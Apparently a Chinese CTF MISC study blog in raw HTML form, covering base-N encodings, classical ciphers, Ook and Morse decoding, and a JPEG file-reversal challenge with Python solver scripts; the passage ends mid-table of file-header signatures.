[1]（ISO基本拉丁字母）表示数字。</p><p>每个base36位需要少于6位的信息来表示。</p><p>摘自wiki的一个例子：</p><p>有符号的32位和64位整数分别最多只能容纳6个或13个base-36位数字（许多base-36位数字可能会使32位和64位整数溢出）。</p><p>例如，在base-36中，“ 922337203685477575807 ” 的64位带符号整数最大值为“ 1Y2P0IJ32E8E7 ”。</p><p>类似地，在base-36中，“ 2147483647 ” 的32位带符号整数最大值为“ ZIK0ZJ ”。</p><p>（这里没看太懂是怎么转换的，请大佬指教~）</p><p>用于从BASE10编码BASE36的Python代码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/gif/42988179/1715055000124-1f75903a-4542-478c-9d7e-520b68ed0d71.gif"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def base36encode(<span class="hljs-keyword">integer</span>): <br>    <span class="hljs-keyword">chars</span> = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> <br>    <br>     sign = <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-keyword">integer</span> &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span> <br>     <span class="hljs-keyword">integer</span> = <span class="hljs-built_in">abs</span>(<span class="hljs-keyword">integer</span>) <br>     <span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span> <br> <br>     <span class="hljs-keyword">while</span> <span class="hljs-keyword">integer</span> &gt; <span class="hljs-number">0</span>: <br>         <span class="hljs-keyword">integer</span>, remainder = divmod(<span class="hljs-keyword">integer</span>, <span class="hljs-number">36</span>) <br>         <span class="hljs-built_in">result</span> = <span class="hljs-keyword">chars</span>[remainder]+<span class="hljs-built_in">result</span><br> <br>      <span class="hljs-literal">return</span> sign+<span class="hljs-built_in">result</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/gif/42988179/1715055000314-d1b81dfc-ace9-4633-9e62-fa0119b9303b.gif"></p><hr><h2 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a><strong>Base58</strong></h2><ul><li>Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</li><li>相比Base64，<strong>Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”&#x2F;“符号</strong>。</li></ul><p>设计Base58主要的目的是：</p><ol><li>避免混淆。在某些字体下，数字0和字母大写O，以及字母大写I和字母小写l会非常相似。</li><li>不使用”+”和”&#x2F;“的原因是非字母或数字的字符串作为帐号较难被接受。</li><li>没有标点符号，通常不会被从中间分行。</li><li>大部分的软件支持双击选择整个字符串。</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000283-ab4e1073-1df1-4a4e-a35a-ea2eeb24d265.png"></p><hr><h2 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a><strong>Base91</strong></h2><p>顾名思义，basE91需要91个字符来表示ASCII编码的二进制数据。 从94个可打印ASCII字符（0x21-0x7E）中，以下三个字符被省略以构建basE91字母：</p><p>-（破折号，0x2D）</p><p>\（反斜杠，0x5C）</p><p>‘（撇号，0x27）</p><ul><li>basE91是将二进制数据编码为ASCII字符的高级方法。</li><li>它类似于UUencode或base64，但效率更高。 basE91产生的开销取决于输入数据。 它的数量最多为23％（而base64为33％），范围可以降低到14％，通常发生在0字节块上。</li><li>这使得basE91对于通过二进制不安全连接（例如电子邮件或终端线）传输较大的文件非常有用。</li></ul><p>转换表由其余字符组成，如下所示。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000380-5bbae422-74c5-4f6e-9e3c-8994b81a1928.png"></p><hr><h2 id="Base92"><a href="#Base92" class="headerlink" title="Base92"></a><strong>Base92</strong></h2><p>有关Base92的资料实在是很少，但是笔者找到了这一篇博客：</p><p><a href="https://thenoviceoof.com/blog/projects/base92/">https://thenoviceoof.com/blog/projects/base92/</a></p><p><strong>以下介绍均摘自这篇博客</strong></p><p>“ 如果您对将二进制信息从一个地方转移到另一地方一无所知，那么就知道将数据从一个地方转移到另一地方 可能很危险。就是说，这对您的数据有害：也许您需要在仅用于ASCII文本的通道上传输Blob ，并且所有’\n’以C样式字符串表示的字节都会突然有一个同级符号’\r’。或者，您的传输层实际上真的真的是以null终止的字符串，并且您恰好在字节边界上连续有8个连续的0位，即使它位于blob中一个32位整数的中间，并且你结束了只有一半您的数据。</p><p>解决此问题的一种方法是使用base64，它使用所有数字和大写&#x2F;小写字母字符对数据进行编码（再加上两个，但现在我们将忽略它们）。现在，您在传输层上尝试解释您的字节时没有任何问题，因为每个人都可以很好地处理字母数字字符，如果没有，您可能不想使用它们。</p><p>当然，使用base64了一段时间后，您可能会注意到，虽然您不会因为一位反复无常的上帝以为他在提供帮助，却没有按照自己的意愿对数据进行更改，但您却通过使用放弃了效率base64。对于二进制blob中的每3个字节，如果需要传输字母数字字符，则有4个字节，因此您要以33％的容量税来支付数据保护费用：如果暴徒可以在保护球拍中掠走33％，相信他们会的。</p><p>看一下base64，您可能会注意到，除了可以使用的64个字符外，还有更多可显示的ASCII字符，base64可以在编码中使用这些字符以提高传输密度。这样就base85诞生了，使用了……您猜对了，有85个字符！这次，将4字节的二进制数据编码为5个ASCII字符，这将导致20％的传输大小开销。但你能做什么呢？好像没有更多可显示的ASCII了……哦，等等。</p><p>所以似乎没有人试图超越明显的下一步base85，所以我决定尝试自己做base92。</p><p>在键入编码的字符串时，&#96;和“与普通引号’太相似，以使其舒适。希望在区分l &#x2F; 1和0 &#x2F; O时使用的字体好。但是，我们将〜用作特殊符号（空字符串）。有94个可打印的ascii字符，因此我们最终得到91个字符，或每个字符6.5位。一旦包含〜，则将有92个字符：因此，为base92。（老实说，base91的名字太丑陋了，无法处理）</p><p>一旦每个字符有6.5位，则可以一次使用13位，并使用类似于base85的除法和取模方案，用它们产生两个输出字符。这可能意味着，与base92编码相比，它更能抵抗损坏，因为任何损坏都更加局限（一位更改仅影响2-3个字节，而不影响4个字节）。</p><p>注意：在某些需要某些输出的情况下，可能需要将〜用作空字符串分号：但是，传递空字符串进行解码不会导致它变成barf，因此不要求使用〜。</p><p>旁注：以前base92产生的输出的长度与输入的长度非单调增长。这已不再是这种情况。</p><p>另一个旁注：base64和base85更加优雅，将一个较小的字节整数干净地映射到另一个较小的字节整数。base92将13个字节映射为16个字符，从大小的角度来看，这比base85的4至5个字符更好，但是相当不雅观。我们还遵循使用高除数乘积作为第一个字节的base85约定。”</p><p>以上是笔者用谷歌翻译直接搬运的，如有描述不懂的小伙伴，请参照原文链接进行参考~</p><hr><h2 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a><strong>Base62</strong></h2><ul><li>Base62编码将数字转换为ASCII字符串（0-9，az和AZ），反之亦然，这通常会导致字符串较短。</li></ul><p>26个小写字母+26个大写字母+10个数字&#x3D;62</p><p><strong>（1）62进制与10进制的互相转化</strong></p><ul><li>62进制转10进制与2进制转10进制相似。</li></ul><p>2进制转10进制过程为： 从右到左用二进制的每个数去乘以2的相应次方，次方要从0开始。</p><p>62进制转10进制也类似，从右往左每个数*62的N次方，N从0开始。</p><p>那么，10进制转62进制也与10进制转2进制类似。 即：不断除以62取余数，然后倒序。</p><p><strong>（2）关于短Url的转换</strong></p><p>主要思路，维护一个全局自增的id，每来一个长url，将其与一个自增id绑定，然后利用base62将该自增id转换为base62字符串，即完成转换。</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055000510-4c2ce6fd-5fe5-4151-80c2-a7a41631a567.png"></h2><p>以上就是对Base系列编码的浅析，部分知识是笔者从wiki上搬运过来的，也参考了很多博客文章和资料。如有错误及不足之处，请大佬们多提建议~</p><p>参考资料：</p><p><a href="https://en.wikipedia.org/wiki">https://en.wikipedia.org/wiki</a></p><p><a href="https://blog.csdn.net/n0nameforn0w/article/details/87124053">https://blog.csdn.net/n0nameforn0w/article/details/87124053</a></p><p><a href="https://thenoviceoof.com/blog/projects/base92/">https://thenoviceoof.com/blog/projects/base92/</a></p><p><a href="https://segmentfault.com/a/1190000010516708">https://segmentfault.com/a/1190000010516708</a></p><hr><p>base16、32、64、85（较大的base）</p><h1 id="base2048"><a href="#base2048" class="headerlink" title="base2048"></a>base2048</h1><p>![[Pasted image 20250322214036.png]]</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>base64-&gt;base85（不断尝试大的base解密）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054840619-03a3ac93-ffe3-4f18-9f20-a1e11db8fb0b.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055163395-c20f725e-8e91-40b0-9fd6-df57b37a1eec.png"></p><p>先进行htlm解密再进行base85解密</p><h1 id="莫斯密码（-和-构成）"><a href="#莫斯密码（-和-构成）" class="headerlink" title="莫斯密码（-和.构成）"></a>莫斯密码（-和.构成）</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715256897011-7833ab5e-7fb5-4c4f-b942-d4a626b29944.png"></p><p>– ..- –.. .. -.- .. … –. —– —– -..</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715257773833-5814f7c9-3c85-4efd-9b86-75849a6312bc.png"></p><h1 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h1><p>分为标准型和W型</p><h1 id="培根密码（只由A、B构成）"><a href="#培根密码（只由A、B构成）" class="headerlink" title="培根密码（只由A、B构成）"></a>培根密码（只由A、B构成）</h1><p>只由A、B构成</p><p>1、培根密码（Bacon’s cipher），本质上是一种替换密码，根据对应转换规则进行加密解密，通过不明显的特征来隐藏明文信息；<br>2、培根密码加密规则，将明文中的每个字母，转换成一组五个英文字母，即可得到密文，转换规则表如下：<br>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB<br>3、培根密码解密时，将密文进行5个字符分组，替换成对应的明文即可。<br>4、培根密码，通常有两种不同的转换规则，一种为即I与J、U与V使用相同的编码，一种为I与J、U与V都使用不同编码。</p><h1 id="html解密"><a href="#html解密" class="headerlink" title="html解密"></a>html解密</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715054779960-15e6c1fb-ccab-41f1-b60d-f3214c01327b.png"></p><h1 id="md5解密"><a href="#md5解密" class="headerlink" title="md5解密"></a>md5解密</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715055871376-83142243-7109-452e-b929-fde75f128b7f.png"></p><h1 id="二维码解码器"><a href="#二维码解码器" class="headerlink" title="二维码解码器"></a>二维码解码器</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083471177-a09935e5-71b5-4097-8c40-55de8162053e.png"></p><p>把？后面的复制下来，进行base64解密</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715083498475-ab2040b3-6036-4618-8a2e-a941448f889e.png"></p><h1 id="兔子解密（rot5、13、18、47）"><a href="#兔子解密（rot5、13、18、47）" class="headerlink" title="兔子解密（rot5、13、18、47）"></a>兔子解密（rot5、13、18、47）</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1717231475092-2ecf40b6-bd4e-4a72-af4f-001efe921c8a.png"></p><h1 id="新佛曰"><a href="#新佛曰" class="headerlink" title="新佛曰"></a>新佛曰</h1><p><a href="http://hi.pcmoe.net/buddha.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTczNzU3NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5NzM3NTQ1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMxMTE0NzQxNX0.mTWIluoUq65XDAhk6XrX9TnWYTlf03r-E2CS43TFFdY">新约佛论禅&#x2F;佛曰加密 - 萌研社 - PcMoe!</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727174685457-337375d6-e901-4a20-b4df-d26b987e4788.png"></p><h1 id="Cimbar"><a href="#Cimbar" class="headerlink" title="Cimbar"></a>Cimbar</h1><p><a href="https://www.bilibili.com/opus/975102170591395840">https://www.bilibili.com/opus/975102170591395840</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/webp/42988179/1731741150326-719c8948-e5c5-4141-8d66-cdd523903c04.webp"></p><p>每个符号在哈希空间内与其他符号相隔至少 20 位，这确保了即使图像模糊或受到其他干扰时，也能清晰区分各个符号。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/webp/42988179/1731741173056-444a9205-9de5-4e3f-a2d2-74fa10ad1e06.webp"></p><h1 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h1><h2 id="SYC"><a href="#SYC" class="headerlink" title="SYC"></a>SYC</h2><p>对着图片敲二进制就行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731741246905-615f38c7-dc35-4c36-9cc1-09740601b03f.png"></p><p>0101 0011 0101 1001 0100 0011 0111 1011</p><p>0100 0001 0110 1110 0011 0000 0111 0100</p><p>0110 1000 0011 0011 0111 0010 0101 1111</p><p>0100 0001 0110 1101 0100 0000 0111 1010</p><p>0011 0001 0110 1110 0011 1001 0101 1111</p><p>0101 0001 0101 0010 0101 1111 0100 0011</p><p>0110 1111 0011 0100 0110 0101 0111 1101</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 给定的二进制数据</span><br>binary_data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">01010011010110010100001101111011</span><br><span class="hljs-string">01000001011011100011000001110100</span><br><span class="hljs-string">01101000001100110111001001011111</span><br><span class="hljs-string">01000001011011010100000001111010</span><br><span class="hljs-string">00110001011011100011100101011111</span><br><span class="hljs-string">01010001010100100101111101000011</span><br><span class="hljs-string">01101111001101000110010101111101</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 将所有二进制数据合并为一个字符串</span><br>binary_data = binary_data.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 将每 8 位转换为一个字符</span><br>text = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_data), <span class="hljs-number">8</span>):<br>    byte = binary_data[i:i+<span class="hljs-number">8</span>]<br>    char = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(byte, <span class="hljs-number">2</span>))  <span class="hljs-comment"># 将 8 位二进制转换为整数，再转换为字符</span><br>    text += char<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;转换后的字符是：&quot;</span>)<br><span class="hljs-built_in">print</span>(text)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731741830974-a2ed3a0b-efcc-4f98-96c7-b746ff80d49e.png"></p><h1 id="ook编码"><a href="#ook编码" class="headerlink" title="ook编码"></a>ook编码</h1><p><a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding [splitbrain.org]</a></p><p>….. ….. ….! ?!!.? ….. ….. ….? .?!.? ….! .?… ….. …..</p><p>..!?! !.?.. ….. ….. ..?.? !.?.. ….. ….. ….. ….. !.?.. …..</p><p>….. .!?!! .?!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?… ….! ?!!.?</p><p>!!!!! !?.?! .?!!! !!!!! !!!!! .!!!. ?…. ….. ….. .!?!! .?… …..</p><p>….. .?.?! .?!.? .</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730350450413-b688bccb-cc64-49f5-9d7a-b065bcd8cb9c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730350469512-8c9170b4-c67b-4984-ba84-6f2fd8cfd284.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件倒序</title>
    <link href="/2025/03/22/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F/"/>
    <url>/2025/03/22/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p><a href="https://blog.csdn.net/MarkRao/article/details/120900188">一道经典的Misc图片倒叙题目_misc png 逆序-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h2><p>看到要倒序，注意他这里是两个字节一组进行倒序的</p><p>jpg 文件头 FF D8 FF E0</p><p>文件尾是 FF D9</p><p>D9FF</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png"></p><p>可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理</p><p>如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png"></p><p>选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开并读取原始文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    a = f.read()<br><br><span class="hljs-comment"># 去掉原始数据中的换行符、空格等不可见字符</span><br>a = a.replace(<span class="hljs-string">b&#x27;\n&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>).replace(<span class="hljs-string">b&#x27;\r&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>).replace(<span class="hljs-string">b&#x27; &#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br><br><span class="hljs-comment"># 将内容逆序</span><br>a = a[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># 将逆序内容写入新的文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\new.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> new:<br>    new.write(a)<br><br><span class="hljs-comment"># 读取逆序后的文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\new.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    b = f.read()<br><br><span class="hljs-comment"># 将内容转换为可变的字节数组</span><br>blist = <span class="hljs-built_in">bytearray</span>(b)<br><br><span class="hljs-comment"># 按两个字节为一组进行交换</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(blist) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    blist[i], blist[i + <span class="hljs-number">1</span>] = blist[i + <span class="hljs-number">1</span>], blist[i]<br><br><span class="hljs-comment"># 打开目标文件以写入最终内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;D:\网站下载\exppy\flag.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> flag:<br>    <span class="hljs-comment"># 将所有处理后的字节内容连续写入文件</span><br>    flag.write(blist)<br><br><span class="hljs-comment"># 打印最终处理的内容（以逆序显示）</span><br><span class="hljs-built_in">print</span>(blist)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_hex_data_from_file</span>(<span class="hljs-params">input_file, output_file</span>):<br>    <span class="hljs-comment"># 读取文件内容</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        hex_data = file.read().strip()<br><br>    <span class="hljs-comment"># 将字符串分成每两个字符一组</span><br>    grouped_data = [hex_data[i:i + <span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(hex_data), <span class="hljs-number">2</span>)]<br><br>    <span class="hljs-comment"># 以16组为一行，每组之间用空格隔开</span><br>    formatted_data = <span class="hljs-string">&#x27;\n&#x27;</span>.join([<span class="hljs-string">&#x27; &#x27;</span>.join(grouped_data[i:i + <span class="hljs-number">16</span>]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(grouped_data), <span class="hljs-number">16</span>)])<br><br>    <span class="hljs-comment"># 将格式化后的数据写入输出文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(formatted_data)<br><br><br><span class="hljs-comment"># 输入和输出文件路径</span><br>input_file = <span class="hljs-string">r&#x27;D:\网站下载\exppy\flag.txt&#x27;</span><br>output_file = <span class="hljs-string">r&#x27;D:\网站下载\exppy\newflag.txt&#x27;</span><br><br><span class="hljs-comment"># 格式化并写入输出文件</span><br>format_hex_data_from_file(input_file, output_file)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723715121060-d6f65c17-7358-467d-a682-ea46aa9ddb2c.png"></p><p>导入十六进制，保存，修改后缀名为jpg，（文件→导入十六进制→保存→重命名为flag.jpg)</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723716388658-a2047cef-993d-4fcf-946f-78ac2b10008b.png"></p><p>得到照片</p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/42988179/1723716519153-5455cc00-e756-47a2-a136-4f594c257acc.jpeg"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723718971683-aa1ec613-1bdb-4841-889a-c5d19ab49252.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1723719180069-ca545beb-a635-46a6-a3f0-f8b744840f6a.png"></p><p>打开就可以看到啦</p><h2 id="补充exp"><a href="#补充exp" class="headerlink" title="补充exp"></a>补充exp</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727076597060-900372ab-0cf0-4eac-87cc-4278854bdba2.png"></p><p>其实直接逆序就行，但是糖了，没想到一个字节是两个十六进制表示，唐了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727076858646-3d55fa0b-1688-46e2-acab-fc6f182ad04f.png"></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">input</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;文件地址&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>input_all=<span class="hljs-built_in">input</span>.<span class="hljs-built_in">read</span>()<br>ss=input_all[::<span class="hljs-number">-1</span>]<br><span class="hljs-built_in">output</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;输出文件地址&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-built_in">output</span>.<span class="hljs-built_in">write</span>(ss)<br><span class="hljs-built_in">input</span>.<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">output</span>.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的文件头</title>
    <link href="/2025/03/22/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <url>/2025/03/22/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721533567453-70a75712-5447-4340-8142-c92303b62ae4.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721533595817-1a97c322-e2c9-4294-bcaf-28ec0734838e.png"></p><h1 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">aJPEG</span><span class="hljs-params">(jpg)</span></span>       　    文件头：FFD8FF　　　　　　　 文件尾：FF D9　<br>　　　　　　　　　　　　　　<br><span class="hljs-function"><span class="hljs-title">PNG</span><span class="hljs-params">(png)</span></span>             `文件头：<span class="hljs-number">89504</span>E47　　　　　　 文件尾：AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br><br><span class="hljs-function"><span class="hljs-title">GIF</span><span class="hljs-params">(gif)</span></span>              文件头：<span class="hljs-number">47494638</span>　　　  　　文件尾：<span class="hljs-number">00</span> <span class="hljs-number">3</span>B<br><br><span class="hljs-function"><span class="hljs-title">ZIP</span><span class="hljs-params">(zip)</span></span>              文件头：<span class="hljs-number">504</span>B0304　　        文件尾：<span class="hljs-number">50</span> <span class="hljs-number">4</span>B<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 